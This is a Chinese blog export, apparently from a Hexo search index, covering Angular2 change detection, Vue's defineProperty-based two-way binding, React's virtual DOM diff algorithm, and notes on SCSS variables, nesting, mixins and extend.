默认的变化检测策略，也就是上述提到的脏检查（只要有值发生变化，就全部检查）。开发者可以根据场景来设置更加高效的变化检测方式：onPush 。onPush 策略，就是只有当输入数据的引用发生变化或者有事件触发时，组件才进行变化检测。 不可变对象（Immutable Objects）不可变对象(Immutable Objects)给我们提供的保障是对象不会改变，即当其内部的属性发生变化时，相对旧有的对象，我们将会保存另一份新的参照。它仅仅依赖输入的属性，也就是当输入属性没有变动（没有变动即没有产生一份新的参照），Angula 将跳过对该组件的全部变化监测，直到有属性变化为止。如果需要在 Angular2 中使用不可变对象，我们需要做的就是设置 changeDetection: ChangeDetectionStrategy.OnPush，如下的例子：1234567891011@Component(&#123; template: ` &lt;h2&gt;&#123; &#123;vData.name&#125; &#125;&lt;/h2&gt; &lt;span&gt;&#123; &#123;vData.email&#125; &#125;&lt;/span&gt; `, // 设置该组件的变化检测策略为onPush changeDetection: ChangeDetectionStrategy.OnPush&#125;)class VCardCmp &#123; @Input() vData;&#125; 比如上面这个例子，当 vData 的属性值发生变化的时候，这个组件不会发生变化检测，只有当 vData 重新赋值的时候才会。一般，只接受输入的木偶子组件（dumb components），也可以理解为子组件，比较适合采用 onPush 策略。 可观察量（Observables）和不可变对象类似，但却又和不可变对象不同，它们有相关变化的时候不会提供一份新的参照，可观测对象在输入属性发生变化的时候来触发一个事件来更新组件视图，同样的，我们也是添加 OnPush 来跳过子组件树的监测器，我们看一个例子：123456789101112131415@Component(&#123; template: '&#123; &#123;counter&#125; &#125;', changeDetection: ChangeDetectionStrategy.OnPush&#125;)class CartBadgeCmp &#123; @Input() addItemStream:Observable&lt;any&gt;; counter = 0; ngOnInit() &#123; this.addItemStream.subscribe(() =&gt; &#123; this.counter++; // application state changed &#125;) &#125;&#125; 该组件是模拟的当用户触发一个事件后增加 counter 这样一个场景，确切的讲，CartBadgeCmp 设置了一个插值 counter 和一个输入属性 addItemStream，当有异步操作需要更新 counter 的时候，将会触发一个事件流，但是输入属性 addItemStream 作为参考对象将不会更改，意味着该组件树的变化监测将不会发生。那怎么办？我们将怎么来通知 Angular 某区块有改变呢？Angular2 的变化监测总是从组件树的头到尾来执行，我们其实需要的就是在整个组件树的某个发生改变的地方来做出相应即可，Angular 是不知道那一块目录有改变的，但是我们知道，我们可以通过依赖注入给组件来引入一个 ChangeDetectorRef ，这个方法正是我们所需要的，它能标记整颗组件树的目录直到下一次变化监测的执行，代码示例如下：12345678910111213class CartBadgeCmp &#123; constructor(private cd: ChangeDetectorRef) &#123;&#125; @Input() addItemStream:Observable&lt;any&gt;; counter = 0; ngOnInit() &#123; this.addItemStream.subscribe(() =&gt; &#123; this.counter++; // application state changed this.cd.markForCheck(); // marks path &#125;) &#125;&#125; 当这个可监测的 addItemStream 触发一个事件，该事件处理句柄将会从根路径到这个已经改变的 addItemStream 组件来处理监测，一旦变化监测跑遍整个监测路径，它将会存储 OnPush 状态到整个组件树。这样做的好处是，变化监测系统将会走遍整棵树，你可以利用他们来监测树在局部是否有真正的改变，以此来做出相应的改变。 VueVue 和 Angular2 一样，也是使用了单向数据流，实现双向绑定也是属性绑定和事件绑定相结合，但是实现的方法却不一样。 怎么知道数据变化了vue 是通过数据劫持的方式来做数据绑定的，其中最核心的方法便是通过Object.defineProperty()来实现对属性的劫持，达到监听数据变动的目的。这个函数是重要的概念，不理解可以去看一下 MDN-Object.defineProperty()Object.defineProperty 是 ES5 中一个无法 shim 的特性，这也就是为什么 Vue 不支持 IE8 以及更低版本浏览器的原因。把一个普通的 JavaScript 对象传给 Vue 实例的 data 选项，Vue 将遍历此对象所有的属性，并使用 Object.defineProperty 把这些属性全部转为 getter/setter。这些 getter/setter 对用户来说是不可见的，但是在内部它们让 Vue 追踪依赖，在属性被访问和修改时通知变化。vue 是采用数据劫持结合发布者-订阅者模式的方式，通过Object.defineProperty() 来劫持各个属性的 setter，getter，在数据变动时发布消息给订阅者，触发相应的监听回调。 vue的发布者-订阅者模式个人觉得比较好的一篇文章，搬运了，以下是搬运的内容，当做学习与记录。 要实现mvvm的双向绑定，就必须要实现以下几点：1、实现一个数据监听器 Observer，能够对数据对象的所有属性进行监听，如有变动可拿到最新值并通知订阅者2、实现一个指令解析器 Compile，对每个元素节点的指令进行扫描和解析，根据指令模板替换数据，以及绑定相应的更新函数3、实现一个 Watcher，作为连接 Observer 和 Compile 的桥梁，能够订阅并收到每个属性变动的通知，执行指令绑定的相应回调函数，从而更新视图4、mvvm 入口函数，整合以上三者 实现Observer我们知道可以利用 Obeject.defineProperty() 来监听属性变动那么将需要 observe 的数据对象进行递归遍历，包括子属性对象的属性，都加上 setter 和 getter 这样的话，给这个对象的某个值赋值，就会触发 setter ，那么就能监听到了数据变化。相关代码可以是这样：123456789101112131415161718192021222324function observe(data) &#123; if (!data || typeof data !== 'object') &#123; return; &#125; // 取出所有属性遍历 Object.keys(data).forEach(function(key) &#123; defineReactive(data, key, data[key]); &#125;);&#125;;function defineReactive(data, key, val) &#123; observe(val); // 监听子属性 Object.defineProperty(data, key, &#123; enumerable: true, // 可枚举 configurable: false, // 不能再define get: function() &#123; return val; &#125;, set: function(newVal) &#123; console.log('哈哈哈，监听到值变化了 ', val, ' --&gt; ', newVal); val = newVal; &#125; &#125;);&#125; 这样我们已经可以监听每个数据的变化了，那么监听到变化之后就是怎么通知订阅者了，所以接下来我们需要实现一个消息订阅器，很简单，维护一个数组，用来收集订阅者，数据变动触发 notify ，再调用订阅者的 update 方法，代码改善之后是这样：1234567891011121314151617181920212223242526272829// ... 省略function defineReactive(data, key, val) &#123; var dep = new Dep(); observe(val); // 监听子属性 Object.defineProperty(data, key, &#123; // ... 省略 set: function(newVal) &#123; if (val === newVal) return; console.log('哈哈哈，监听到值变化了 ', val, ' --&gt; ', newVal); val = newVal; dep.notify(); // 通知所有订阅者 &#125; &#125;);&#125;function Dep() &#123; this.subs = [];&#125;Dep.prototype = &#123; addSub: function(sub) &#123; this.subs.push(sub); &#125;, notify: function() &#123; this.subs.forEach(function(sub) &#123; sub.update(); &#125;); &#125;&#125;; 那么问题来了，谁是订阅者？怎么往订阅器添加订阅者？没错，上面的思路整理中我们已经明确订阅者应该是 Watcher , 而且 var dep = new Dep(); 是在 defineReactive 方法内部定义的，所以想通过 dep 添加订阅者，就必须要在闭包内操作，所以我们可以在 getter 里面动手脚：12345678910111213141516171819// Observer.js// ...省略Object.defineProperty(data, key, &#123; get: function() &#123; // 由于需要在闭包内添加watcher，所以通过Dep定义一个全局target属性，暂存watcher, 添加完移除 Dep.target &amp;&amp; dep.addDep(Dep.target); return val; &#125; // ... 省略&#125;);// Watcher.jsWatcher.prototype = &#123; get: function(key) &#123; Dep.target = this; this.value = data[key]; // 这里会触发属性的getter，从而添加订阅者 Dep.target = null; &#125;&#125; 这里已经实现了一个 Observer 了，已经具备了监听数据和数据变化通知订阅者的功能。 实现Compilecompile 主要做的事情是解析模板指令，将模板中的变量替换成数据，然后初始化渲染页面视图，并将每个指令对应的节点绑定更新函数，添加监听数据的订阅者，一旦数据有变动，收到通知，更新视图，如图所示： 12345678910111213141516171819function Compile(el) &#123; this.$el = this.isElementNode(el) ? el : document.querySelector(el); if (this.$el) &#123; this.$fragment = this.node2Fragment(this.$el); this.init(); this.$el.appendChild(this.$fragment); &#125;&#125;Compile.prototype = &#123; init: function() &#123; this.compileElement(this.$fragment); &#125;, node2Fragment: function(el) &#123; var fragment = document.createDocumentFragment(), child; // 将原生节点拷贝到fragment while (child = el.firstChild) &#123; fragment.appendChild(child); &#125; return fragment; &#125;&#125;; compileElement 方法将遍历所有节点及其子节点，进行扫描解析编译，调用对应的指令渲染函数进行数据渲染，并调用对应的指令更新函数进行绑定，详看代码及注释说明：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566Compile.prototype = &#123; // ... 省略 compileElement: function(el) &#123; var childNodes = el.childNodes, me = this; [].slice.call(childNodes).forEach(function(node) &#123; var text = node.textContent; var reg = /&#123; &#123;(.*)&#125; &#125;/; // 表达式文本 // 按元素节点方式编译 if (me.isElementNode(node)) &#123; me.compile(node); &#125; else if (me.isTextNode(node) &amp;&amp; reg.test(text)) &#123; me.compileText(node, RegExp.$1); &#125; // 遍历编译子节点 if (node.childNodes &amp;&amp; node.childNodes.length) &#123; me.compileElement(node); &#125; &#125;); &#125;, compile: function(node) &#123; var nodeAttrs = node.attributes, me = this; [].slice.call(nodeAttrs).forEach(function(attr) &#123; // 规定：指令以 v-xxx 命名 // 如 &lt;span v-text=\"content\"&gt;&lt;/span&gt; 中指令为 v-text var attrName = attr.name; // v-text if (me.isDirective(attrName)) &#123; var exp = attr.value; // content var dir = attrName.substring(2); // text if (me.isEventDirective(dir)) &#123; // 事件指令, 如 v-on:click compileUtil.eventHandler(node, me.$vm, exp, dir); &#125; else &#123; // 普通指令 compileUtil[dir] &amp;&amp; compileUtil[dir](node, me.$vm, exp); &#125; &#125; &#125;); &#125;&#125;;// 指令处理集合var compileUtil = &#123; text: function(node, vm, exp) &#123; this.bind(node, vm, exp, 'text'); &#125;, // ...省略 bind: function(node, vm, exp, dir) &#123; var updaterFn = updater[dir + 'Updater']; // 第一次初始化视图 updaterFn &amp;&amp; updaterFn(node, vm[exp]); // 实例化订阅者，此操作会在对应的属性消息订阅器中添加了该订阅者watcher new Watcher(vm, exp, function(value, oldValue) &#123; // 一旦属性值有变化，会收到通知执行此更新函数，更新视图 updaterFn &amp;&amp; updaterFn(node, value, oldValue); &#125;); &#125;&#125;;// 更新函数var updater = &#123; textUpdater: function(node, value) &#123; node.textContent = typeof value == 'undefined' ? '' : value; &#125; // ...省略&#125;; 这里通过递归遍历保证了每个节点及子节点都会解析编译到，包括了 { {} } 表达式声明的文本节点。指令的声明规定是通过特定前缀的节点属性来标记，如 &lt;span v-text=&quot;content&quot; other-attr中 v-text 便是指令，而 other-attr 不是指令，只是普通的属性。监听数据、绑定更新函数的处理是在 compileUtil.bind() 这个方法中，通过 new Watcher() 添加回调来接收数据变化的通知。至此，一个简单的Compile就完成了。 实现WatcherWatcher 订阅者作为 Observer 和 Compile 之间通信的桥梁，主要做的事情是:1、在自身实例化时往属性订阅器( dep )里面添加自己2、自身必须有一个 update() 方法3、待属性变动 dep.notice() 通知时，能调用自身的 update() 方法，并触发 Compile 中绑定的回调，则功成身退。如果有点乱，可以回顾前面的思路整理123456789101112131415161718192021222324252627282930313233343536373839404142function Watcher(vm, exp, cb) &#123; this.cb = cb; this.vm = vm; this.exp = exp; // 此处为了触发属性的getter，从而在dep添加自己，结合Observer更易理解 this.value = this.get(); &#125;Watcher.prototype = &#123; update: function() &#123; this.run(); // 属性值变化收到通知 &#125;, run: function() &#123; var value = this.get(); // 取到最新值 var oldVal = this.value; if (value !== oldVal) &#123; this.value = value; this.cb.call(this.vm, value, oldVal); // 执行Compile中绑定的回调，更新视图 &#125; &#125;, get: function() &#123; Dep.target = this; // 将当前订阅者指向自己 var value = this.vm[exp]; // 触发getter，添加自己到属性订阅器中 Dep.target = null; // 添加完毕，重置 return value; &#125;&#125;;// 这里再次列出Observer和Dep，方便理解Object.defineProperty(data, key, &#123; get: function() &#123; // 由于需要在闭包内添加watcher，所以可以在Dep定义一个全局target属性，暂存watcher, 添加完移除 Dep.target &amp;&amp; dep.addDep(Dep.target); return val; &#125; // ... 省略&#125;);Dep.prototype = &#123; notify: function() &#123; this.subs.forEach(function(sub) &#123; sub.update(); // 调用订阅者的update方法，通知变化 &#125;); &#125;&#125;; 实例化 Watcher 的时候，调用 get() 方法，通过 Dep.target = watcherInstance 标记订阅者是当前 watcher 实例，强行触发属性定义的 getter 方法，getter 方法执行的时候，就会在属性的订阅器 dep 添加当前 watcher 实例，从而在属性值有变化的时候， watcherInstance 就能收到更新通知。 实现MVVM MVVM 作为数据绑定的入口，整合 Observer 、Compile 和 Watcher 三者，通过 Observer 来监听自己的 model 数据变化，通过 Compile 来解析编译模板指令，最终利用 Watcher 搭起 Observer 和 Compile 之间的通信桥梁，达到数据变化 -&gt; 视图更新；视图交互变化(input) -&gt; 数据 model 变更的双向绑定效果。 一个简单的MVVM构造器是这样子：123456function MVVM(options) &#123; this.$options = options; var data = this._data = this.$options.data; observe(data, this); this.$compile = new Compile(options.el || document.body, this)&#125; 但是这里有个问题，从代码中可看出监听的数据对象是 options.data ，每次需要更新视图，则必须通过 var vm = new MVVM({data:{name: &#39;kindeng&#39;} }); vm._data.name = &#39;dmq&#39;;这样的方式来改变数据。 显然不符合我们一开始的期望，我们所期望的调用方式应该是这样的：var vm = new MVVM({data: {name: &#39;kindeng&#39;} }); vm.name = &#39;dmq&#39;; 所以这里需要给 MVVM 实例添加一个属性代理的方法，使访问 vm 的属性代理为访问 vm._data 的属性，改造后的代码如下：1234567891011121314151617181920212223242526function MVVM(options) &#123; this.$options = options; var data = this._data = this.$options.data, me = this; // 属性代理，实现 vm.xxx -&gt; vm._data.xxx Object.keys(data).forEach(function(key) &#123; me._proxy(key); &#125;); observe(data, this); this.$compile = new Compile(options.el || document.body, this)&#125;MVVM.prototype = &#123; _proxy: function(key) &#123; var me = this; Object.defineProperty(me, key, &#123; configurable: false, enumerable: true, get: function proxyGetter() &#123; return me._data[key]; &#125;, set: function proxySetter(newVal) &#123; me._data[key] = newVal; &#125; &#125;); &#125;&#125;; 这里主要还是利用了 Object.defineProperty() 这个方法来劫持了 vm 实例对象的属性的读写权，使读写 vm 实例的属性转成读写了 vm._data 的属性值。 React在React中，数据流是自上而下单向的从父节点传递到子节点，也就是只有单向绑定，并没有 Angular2 和 Vue 的双向绑定 ，但是我们也可以自己实现双向绑定，这里就不说了，给出一篇文章，里面说到了 React 双向绑定的实现方法，可以自己去看看。 怎么知道数据变化了React 通过setState()通知变化 数据更新React 最出名的就是 虚拟DOM（virtual DOM），Vue（2.0版本）也有虚拟DOM（Vue宣称可以更快地计算出Virtual DOM的差异，这是由于它在渲染过程中，会跟踪每一个组件的依赖关系，不需要重新渲染整个组件树。）但我们不在 Vue 里面讲 virtual DOM 而是放到 React 来讲。 什么是Virtual DOMVirtual DOM并没有完全实现 DOM，Virtual DOM最主要的还是保留了 Element 之间的层次关系和一些基本属性。Virtual DOM 里每一个 Element 实际上只有几个属性，并且没有那么多乱七八糟的引用。所以哪怕是直接把 Virtual DOM 删了，根据新传进来的数据重新创建一个新的 Virtual DOM 出来都非常非常非常快。我们可以看看下面这个列表在HTML中的代码是如何写的：1234&lt;ul class=\"list\"&gt; &lt;li&gt;item 1&lt;/li&gt; &lt;li&gt;item 2&lt;/li&gt;&lt;/ul&gt; 而在JavaScript中，我们可以用对象简单地创造一个针对上面例子的映射：12345678&#123; type: 'ul', props: &#123;'class': 'list'&#125;, children: [ &#123; type: 'li', props: &#123;&#125;, children: ['item 1'] &#125;, &#123; type: 'li', props: &#123;&#125;, children: ['item 2'] &#125; ]&#125; 真实的 Virtual DOM 会比上面的例子更复杂，但它本质上是一个嵌套着数组的原生对象。 为什么要用 Virtual DOM这是因为更新 DOM 的花费时间非常长，当我们使用 JavaScript 来改变页面的时候，浏览器不得不做一些工作来找到需要的DOM节点。在如今的应用程序的DOM中大概有成千上万的节点，因此更新所花费的时间就更长了。有很多不可避免的很小很频繁的更新拖慢了页面的速度。 注意：如果你的应用中，交互复杂，需要处理大量的UI变化，那么使用 Virtual DOM 是一个好主意。如果你更新元素并不频繁，那么 Virtual DOM 并不一定适用，性能很可能还不如直接操控 DOM。 为什么 Virtual DOM 可以提高网页性能状态变更-&gt;重新渲染整个视图的方式可以稍微修改一下：用 JavaScript 对象表示 DOM 信息和结构，当状态变更的时候，重新渲染这个 JavaScript 的对象结构。当然这样做其实没什么卵用，因为真正的页面其实没有改变。但是可以用新渲染的对象树去和旧的树进行对比，记录这两棵树差异。记录下来的不同就是我们需要对页面真正的 DOM 操作，然后把它们应用在真正的 DOM 树上，页面就变更了。这样就可以做到：视图的结构确实是整个全新渲染了，但是最后操作DOM的时候确实只变更有不同的地方。这就是所谓的 Virtual DOM 算法。包括几个步骤： 用 JavaScript 对象结构表示 DOM 树的结构；然后用这个树构建一个真正的 DOM 树，插到文档当中 当状态变更的时候，重新构造一棵新的对象树。然后用新的树和旧的树进行比较，记录两棵树差异 把第 2 步所记录的差异应用到第 1 步所构建的真正的DOM树上，视图就更新了 Virtual DOM 本质上就是在 JS 和 DOM 之间做了一个缓存。可以类比 CPU 和硬盘，既然硬盘这么慢，我们就在它们之间加个缓存：既然 DOM 这么慢，我们就在它们 JS 和 DOM 之间加个缓存。CPU（JS）只操作内存（Virtual DOM），最后的时候再把变更写入硬盘（DOM）。 diff算法比较两棵DOM树的差异是 Virtual DOM 算法最核心的部分，这也是所谓的 Virtual DOM 的 diff 算法。两个树的完全的 diff 算法是一个时间复杂度为 O(n^3) 的问题。但是在前端当中，你很少会跨越层级地移动 DOM 元素。所以 Virtual DOM 只会对同一个层级的元素进行对比： 上面的 div只会和同一层级的 div 对比，第二层级的只会跟第二层级对比。这样算法复杂度就可以达到 O(n)。 在实际的代码中，会对新旧两棵树进行一个深度优先的遍历，这样每个节点都会有一个唯一的标记： 在深度优先遍历的时候，每遍历到一个节点就把该节点和新的的树进行对比。如果有差异的话就记录到一个对象里面。 1234567891011121314151617181920212223242526272829// diff 函数，对比两棵树function diff (oldTree, newTree) &#123; var index = 0 // 当前节点的标志 var patches = &#123;&#125; // 用来记录每个节点差异的对象 dfsWalk(oldTree, newTree, index, patches) return patches&#125;// 对两棵树进行深度优先遍历function dfsWalk (oldNode, newNode, index, patches) &#123; // 对比oldNode和newNode的不同，记录下来 patches[index] = [...] diffChildren(oldNode.children, newNode.children, index, patches)&#125;// 遍历子节点function diffChildren (oldChildren, newChildren, index, patches) &#123; var leftNode = null var currentNodeIndex = index oldChildren.forEach(function (child, i) &#123; var newChild = newChildren[i] currentNodeIndex = (leftNode &amp;&amp; leftNode.count) // 计算节点的标识 ? currentNodeIndex + leftNode.count + 1 : currentNodeIndex + 1 dfsWalk(child, newChild, currentNodeIndex, patches) // 深度遍历子节点 leftNode = child &#125;)&#125; 例如，上面的 div 和新的 div 有差异，当前的标记是0，那么：patches[0] = [{difference}, {difference}, ...] // 用数组存储新旧节点的不同同理 p 是 patches[1]，ul 是 patches[3] ，类推。 如果想了解 Vue Virtual DOM具体算法，可以参考这篇文章 注意：由于hexo的问题，不能在代码块中出现&#123;&#123;或&#125;&#125; 的字符,所以只能在&#123;&#123;中间加一个空格 参考深入理解Angular2变化监测和ngZoneAngular变化检测机制：改善的脏检查angular2 脏检查总述–zone.js 原理剖析Vue原理&amp;实现双向绑定MVVM对比其他框架深度剖析：如何实现一个 Virtual DOM 算法如何理解虚拟DOM?","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"Angular-React-Vue","slug":"Angular-React-Vue","permalink":"https://recallhyx.github.io/tags/Angular-React-Vue/"}]},{"title":"SCSS的一些笔记","slug":"SCSS的一些笔记","date":"2018-03-16T06:34:56.000Z","updated":"2018-03-16T07:22:47.492Z","comments":true,"path":"2018/03/16/SCSS的一些笔记/","link":"","permalink":"https://recallhyx.github.io/2018/03/16/SCSS的一些笔记/","excerpt":"","text":"安装基于webpack如果是在 vue-cli 项目中，可以使用以下命令安装12npm install node-sass --save-devnpm install sass-loader --save-dev vue-cli生成的项目，已经默认加入了处理sass的loader只需要在需要的地方加入lang=scss即可123&lt;style lang='scss' scope&gt;...&lt;/style&gt; 不是基于webpack按照(官网教程)[https://www.sass.hk/install/]，手动把 scss 编译成 css 文件，然后自己引入。 SCSS 介绍Sass 有两种语法规则(syntaxes),目前新的语法规则（从 Sass 3开始）被称为 “SCSS”( 时髦的css（Sassy CSS）),它是 css3 语法的的拓展级，就是说每一个语法正确的 CSS3 文件也是合法的 SCSS 文件，SCSS 文件使用 .scss 作为拓展名。第二种语法别成为缩进语法（或者 Sass），它受到了 Haml 的简洁精炼的启发，它是为了人们可以用和 css 相近的但是更精简的方式来书写 css 而诞生的。它没有括号，分号，它使用 行缩进 的方式来指定 css 块，虽然 sass 不是最原始的语法，但是缩进语法将继续被支持，在缩进语法的文件以 .sass 为拓展名。所以 SCSS 是 Sass 的其中一种语法规则而已，即 SCSS 是 Sass 的子集 SCSS 特性SCSS 加入了很多特性，例如，变量，嵌套，类似函数，继承，混合器，一切都是为了在写 css 的时候，不大量重复代码，注意，这只是在写的时候省去了重复的工作，滥用 SCSS ，会导致编译后的 css 文件过大，降低网站加载速度。下面介绍一下 SCSS 的特性。 变量声明一个变量：$div-color:#F90 以$符开头，后面是变量名，之后跟一个 : ，然后赋值，我们甚至可以用空格隔开多个值，就像我们原本写 css 那样：$div-border:1px solid black。然后我们就可以使用这个变量了1234$div-color:#F90div &#123; color: $div-color;&#125; 与 CSS 属性不同，变量可以在 css 规则块定义之外存在。当变量定义在 css 规则块内，那么该变量只能在此规则块内使用。123456789101112$nav-color: #F90;nav &#123; $width: 100px; width: $width; color: $nav-color;&#125;//编译后nav &#123; width: 100px; color: #F90;&#125; 在这段代码中，$nav-color 这个变量定义在了规则块外边，所以在这个样式表中都可以像 nav 规则块那样引用它。$width 这个变量定义在了 nav 的 { } 规则块内，所以它只能在 nav 规则块 内使用。这意味着是你可以在样式表的其他地方定义和使用 $width 变量，不会对这里造成影响。我们完全可以嵌套定义一个变量：12345678910$highlight-color: #F90;$highlight-border: 1px solid $highlight-color;.selected &#123; border: $highlight-border;&#125;//编译后.selected &#123; border: 1px solid #F90;&#125; 这里，$highlight-border 变量的声明中使用了 $highlight-color 这个变量。产生的效 果就跟你直接为 border 属性设置了一个 1px $highlight-color solid 的值是一样的。对于变量名，推荐用 - 连接符而不是 _，虽然这两个东西 SCSS 都会认为是同一个东西：123456789$link-color: blue;a &#123; color: $link_color;&#125;//编译后a &#123; color: blue;&#125; 但是用 - 连接符连接更接近我们原本的 CSS 写法。 嵌套有了嵌套，我们可以不用重复大段代码，而且可读性更高了：1234567891011#content &#123; article &#123; h1 &#123; color: #333 &#125; p &#123; margin-bottom: 1.4em &#125; &#125; aside &#123; background-color: #EEE &#125;&#125; /* 编译后 */#content article h1 &#123; color: #333 &#125;#content article p &#123; margin-bottom: 1.4em &#125;#content aside &#123; background-color: #EEE &#125; SCSS 会一层一层解开嵌套，首先，把 #content（父级）这个 id 放到 article 选择器（子级）和 aside 选择器（子级）的前边：1234567#content &#123; article &#123; h1 &#123; color: #333 &#125; p &#123; margin-bottom: 1.4em &#125; &#125; #content aside &#123; background-color: #EEE &#125;&#125; 然后，#content article 里边还有嵌套的规则，SCSS 重复一遍上边的步骤，把新的选择器添加到内嵌的选择器前边。1234 /* 编译后 */#content article h1 &#123; color: #333 &#125;#content article p &#123; margin-bottom: 1.4em &#125;#content aside &#123; background-color: #EEE &#125; 我们可以嵌套任意的 CSS，但是当我们想用伪类例如:hover时，就会出现一种情况1234div a &#123; color: blue; :hover &#123; color: red &#125;&#125; 这种嵌套，让 SCSS 解析后，会得到这样的结果：color: red 这条规则将会被应用到选择器 div a :hover，div 元素内链接的所有子元素在被 hover 时都会变成红色。 鼠标悬浮在span标签 鼠标悬浮在a标签 这不是我们想要的结果，怎么办呢？解决之道为使用一个特殊的 SCSS 选择器，即父选择器。在使用嵌套规则时，父选择器能对于嵌套规则如何解开提供更好的控制。它就是一个简单的 &amp; 符号，且可以放在任何一个选择器可出现的地方。1234div a &#123; color: blue; &amp;:hover &#123; color: red &#125;&#125; 当包含父选择器标识符的嵌套规则被打开时，它不会像后代选择器那样进行拼接，而是 &amp; 被父选择器直接替换：12div a &#123; color: blue &#125;div a:hover &#123; color: red &#125; 这样，整个链接都会匹配到规则。父选择器标识符还有另外一种用法，你可以在父选择器之前添加选择器。举例来说，当用户在使用IE浏览器时，你会通过JavaScript在 &lt;body&gt; 标签上添加一个ie的类名，为这种情况编写特殊的样式如下：1234567#content aside &#123; color: red; body.ie &amp; &#123; color: green &#125;&#125;/*编译后*/#content aside &#123;color: red&#125;;body.ie #content aside &#123; color: green &#125; 当我们使用群组选择器的时候，用 css 语法，重复的代码就会变多1.container h1, .container h2, .container h3 &#123; margin-bottom: .8em &#125; 这时我们可以用 SCSS 的嵌套：123.container &#123; h1, h2, h3 &#123;margin-bottom: .8em&#125;&#125; 当我们使用子组合选择器和同层组合选择器：&gt; 、+ 和 ~的时候，也可以用嵌套的方式：123456789101112131415article &#123; ~ article &#123; border-top: 1px dashed #ccc &#125; &gt; section &#123; background: #eee &#125; dl &gt; &#123; dt &#123; color: #333 &#125; dd &#123; color: #555 &#125; &#125; nav + &amp; &#123; margin-top: 0 &#125;&#125;/*编译后*/article ~ article &#123; border-top: 1px dashed #ccc &#125;article &gt; footer &#123; background: #eee &#125;article dl &gt; dt &#123; color: #333 &#125;article dl &gt; dd &#123; color: #555 &#125;nav + article &#123; margin-top: 0 &#125; 在 SCSS 中，除了 CSS 选择器，属性也可以进行嵌套。尽管编写属性涉及的重复不像编写选择器那么糟糕，但是要反复写border-style border-width border-color 以及border-* 等也是非常烦人的。在 SCSS 中，你只需敲写一遍border：1234567nav &#123; border: &#123; style: solid; width: 1px; color: #ccc; &#125;&#125; 嵌套属性的规则是这样的：把属性名从中划线-的地方断开，在根属性后边添加一个冒号:，紧跟一个 { } 块，把子属性部分写在这个 { } 块中。就像 css 选择器嵌套一样，SCSS 会把你的子属性一一解开，把根属性和子属性部分通过中划线 - 连接起来，最后生成的效果与你手动一遍遍写的css样式一样：12345nav &#123; border-style: solid; border-width: 1px; border-color: #ccc;&#125; 混合器如果你的整个网站中有几处小小的样式类似（例如一致的颜色和字体），那么使用变量来统一处理这种情况是非常不错的选择。但是当你的样式变得越来越复杂，你需要大段大段的重用样式的代码，独立的变量就没办法应付这种情况了。你可以通过 SCSS 的混合器实现大段样式的重用。混合器使用 @mixin 标识符定义。看上去很像其他的CSS @标识符，比如说@media 或者 @font-face 。这个标识符给一大段样式赋予一个名字，这样你就可以轻易地通过引用这个名字重用这段样式。下边的这段 SCSS 代码，定义了一个非常简单的混合器，目的是添加跨浏览器的圆角边框。12345@mixin rounded-corners &#123; -moz-border-radius: 5px; -webkit-border-radius: 5px; border-radius: 5px;&#125; 然后就可以在你的样式表中通过 @include 来使用这个混合器，放在你希望的任何地方。@include 调用会把混合器中的所有样式提取出来放在 @include 被调用的地方。如果像下边这样写：1234567891011121314notice &#123; background-color: green; border: 2px solid #00aa00; @include rounded-corners;&#125;//sass最终生成：.notice &#123; background-color: green; border: 2px solid #00aa00; -moz-border-radius: 5px; -webkit-border-radius: 5px; border-radius: 5px;&#125; 在.notice 中的属性 border-radius -moz-border-radius 和-webkit-border-radius全部来自 rounded-corners 这个混合器。正如我们一开始所说的，使用 SCSS 虽然会减少我们写代码的重复性工作，但是滥用 SCSS 会造成编译后的 CSS 文件过大，混合器就是一个很好的例子，它只是将代码引入，如果我们在哪里都用混合器，看起来我们写的文件小，其实编译后的文件比我们想象的还要大，这个时候我们就要知道何时使用混合器。 判断一组属性是否应该组合成一个混合器，一条经验法则就是你能否为这个混合器想出一个好的名字。如果你能找到一个很好的短名字来描述这些属性修饰的样式，比如rounded-corners fancy-font或者no-bullets，那么往往能够构造一个合适的混合器。如果你找不到，这时候构造一个混合器可能并不合适。 混合器并不一定总得生成相同的样式。可以通过在 @include 混合器时给混合器传参，来定制混合器生成的精确样式。当 @include 混合器时，参数其实就是可以赋值给css属性值的变量。如果你写过 JavaScript ，这种方式跟 JavaScript 的function 很像：12345@mixin link-colors($normal, $hover, $visited) &#123; color: $normal; &amp;:hover &#123; color: $hover; &#125; &amp;:visited &#123; color: $visited; &#125;&#125; 当混合器被 @include 时，你可以把它当作一个 css 函数来传参。如果你像下边这样写：12345678a &#123; @include link-colors(blue, red, green);&#125;//Sass最终生成的是：a &#123; color: blue; &#125;a:hover &#123; color: red; &#125;a:visited &#123; color: green; &#125; 当你 @include 混合器时，有时候可能会很难区分每个参数是什么意思，参数之间是一个什么样的顺序。为了解决这个问题，SCSS 允许通过语法 $name: value的形式指定每个参数的值。这种形式的传参，参数顺序就不必再在乎了，只需要保证没有漏掉参数即可：1234567a &#123; @include link-colors( $normal: blue, $visited: green, $hover: red );&#125; 尽管给混合器加参数来实现定制很好，但是有时有些参数我们没有定制的需要，这时候也需要赋值一个变量就变成很痛苦的事情了。所以 SCSS 允许混合器声明时给参数赋默认值。为了在 @include 混合器时不必传入所有的参数，我们可以给参数指定一个默认值。参数默认值使用 $name: default-value的声明形式，默认值可以是任何有效的css 属性值，甚至是其他参数的引用，如下代码：12345678910@mixin link-colors( $normal, $hover: $normal, $visited: $normal )&#123; color: $normal; &amp;:hover &#123; color: $hover; &#125; &amp;:visited &#123; color: $visited; &#125;&#125; 如果像下边这样调用：@include link-colors(red) ， $hover 和 $visited 也会被自动赋值为red。 继承使用 SCSS 的时候，最后一个减少重复的主要特性就是选择器继承。基于Nicole Sullivan 面向对象的 css 的理念，选择器继承是说一个选择器可以继承为另一个选择器定义的所有样式。这个通过 @extend 语法实现，如下代码：123456789//通过选择器继承继承样式.error &#123; border: 1px solid red; background-color: #fdd;&#125;.seriousError &#123; @extend .error; border-width: 3px;&#125; 在上边的代码中，.seriousError 将会继承样式表中任何位置处为 .error 定义的所有样式。以 class=&quot;seriousError&quot; 修饰的 html元素最终的展示效果就好像是class=&quot;seriousError error&quot;。相关元素不仅会拥有一个 3px 宽的边框，而且这个边框将变成红色的，这个元素同时还会有一个浅红色的背景，因为这些都是在 .error 里边定义的样式。 .seriousError 不仅会继承 .error 自身的所有样式，任何跟 .error 有关的组合选择器样式也会被 .seriousError以组合选择器的形式继承，如下代码:12345678//.seriousError从.error继承样式.error a&#123; //应用到.seriousError a color: red; font-weight: 100;&#125;h1.error &#123; //应用到hl.seriousError font-size: 1.2rem;&#125; 